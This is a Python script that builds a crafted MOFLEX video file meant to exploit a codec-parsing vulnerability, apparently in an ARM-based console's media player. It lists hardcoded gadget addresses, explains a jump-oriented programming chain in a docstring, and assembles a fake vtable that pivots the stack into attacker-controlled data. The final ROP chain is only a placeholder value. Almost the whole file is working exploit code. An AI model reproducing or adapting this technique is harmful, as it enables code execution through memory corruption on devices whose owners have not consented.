from moflex import *
from struct import pack

MOFLEX_BUFFER = 0x3058f6b8

MOV_R4R0_LDR_R0R0_LDR_R1_R0_14_MOV_R0R4_BLX_R1  = 0x0033bd78
LDR_R3R4_C_LDR_R2R4_10_MOV_R1_0_MOV_R0R4_BLX_R3 = 0x002d29dc
MOV_R1R2_LDR_R3_R0_1C_MOV_R0R4_BLX_R3           = 0x0037e90c
MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1                = 0x001425c0
ADD_SPSP_20_POP_R4PC                            = 0x001bbd34

"""
.::JOP Chain::.

r0 = rop buffer base address
the purpose of this JOP-chain is to load a value into r1 to finally stack-pivot
since r0 already points to our data, we only need to set r1

0x0033bd78: mov r4, r0; ldr r0, [r0]; ldr r1, [r0, #0x14]; mov r0, r4; blx r1;
0x002d29dc: ldr r3, [r4, #0xc]; cmp r3, #0; beq ...; ldr r2, [r4, #0x10]; mov r1, #0; mov r0, r4; blx r3;
0x0037e90c: mov r1, r2; ldr r3, [r0, #0x1c]; mov r0, r4; blx r3;
0x001425c0: mov sp, r0; mov r0, r2; mov lr, r3; bx r1;
0x001bbd34: add sp, sp, #0x20; pop {r4, pc};
"""

def makeRop(baseAddr):
    rop = bytearray()
    def addWord(word):
        nonlocal rop
        rop += pack("<I", word)

    addWord(baseAddr)                                       #baseAddr+0x0000: points to itself (used for jop and initial vtable call)
    addWord(0xDEADC0DE)                                     #baseAddr+0x0004: unused
    addWord(MOV_R4R0_LDR_R0R0_LDR_R1_R0_14_MOV_R0R4_BLX_R1) #baseAddr+0x0008: initial vtable call, set r4=r0 and jumps to [baseAddr+0x0014]
    addWord(MOV_R1R2_LDR_R3_R0_1C_MOV_R0R4_BLX_R3)          #baseAddr+0x000C: 3rd gadget, set r1=r2 and jumps to [baseAddr+0x001C]
    addWord(ADD_SPSP_20_POP_R4PC)                           #baseAddr+0x0010: final jump after stack-pivoting, jump to ropchain @ baseAddr+0x0024
    addWord(LDR_R3R4_C_LDR_R2R4_10_MOV_R1_0_MOV_R0R4_BLX_R3)#baseAddr+0x0014: 2nd gadget, set r2=[baseAddr+0x0010] and jumps to [baseAddr+0x000C]
    addWord(0xDEADC0DE)                                     #baseAddr+0x0018: unused
    addWord(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1)               #baseAddr+0x001C: 4th gadget, set sp=r0 and jumps to [baseAddr+0x0010]

    addWord(0xDEADC0DE)                                     #baseAddr+0x0020: R4, unused
    addWord(0xDEADBEEF)                                     #baseAddr+0x0024: ropchain start

    return rop

def makeMoflexBin():
    bin  = bytearray()
    bin += makeSynchoHeader(0x0000000000000001)
    #only care about the codec which will trigger the vuln, everything else is irrelevant
    bin += makeAudioSynchroChunk(0x00, AUDIO_CODEC_TYPE_PCM16, 0x0000, 0x01)

    #data are after chunk type and chunk size (1 + 4 = 5 bytes)
    endSynchroChunkDataOffset = (len(bin) + 0x5)
    #4 bytes alignment
    ropDataOffset = (endSynchroChunkDataOffset + 3) & ~3
    padding = b'\x00'*(ropDataOffset-endSynchroChunkDataOffset)
    ropBufferAddr = MOFLEX_BUFFER + ropDataOffset
    rop = padding + makeRop(ropBufferAddr)

    bin += makeEndSynchroChunk4BytesSize(rop)
    bin += makeDataBlock(0x00)
    bin += makeEp([], 0x00, 0, 0)

    setSynchroHeaderSize(bin, len(bin))
    return bin, ropBufferAddr
